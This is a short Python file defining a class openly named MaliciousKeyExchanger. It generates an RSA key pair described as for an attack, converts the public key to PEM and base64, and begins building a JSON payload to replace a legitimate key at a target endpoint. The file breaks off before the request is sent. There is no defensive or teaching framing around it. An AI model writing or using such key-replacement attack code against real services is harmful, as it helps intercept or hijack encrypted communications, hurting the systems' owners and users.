import requests
import base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

#Class MaliciousKey Exchanger
class MaliciousKeyExchanger:
    def __init__(self):
        self.compromised_keys = {}
    
#Create RSA key Pair for malicious purpose
    def create_attack_keypair(self):
        attacker_private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        attacker_public_key = attacker_private_key.public_key()
        return attacker_private_key, attacker_public_key
    
#Converts RSA public key to PEM format
    def serialize_public_key(self, public_key):
        return public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

#Execute attack by replacing legitimate key
    def execute_key_replacement(self, endpoint_url):
        attacker_private_key, attacker_public_key = self.create_attack_keypair()

        # Convert the attacker's public key to a format suitable for transmission
        pem_public_key = self.serialize_public_key(attacker_public_key)

        # Craft the payload and send the request
        encoded_key = base64.b64encode(pem_public_key).decode()
        payload = {"key": encoded_key}
        headers = {"Content-Type": "application/json"}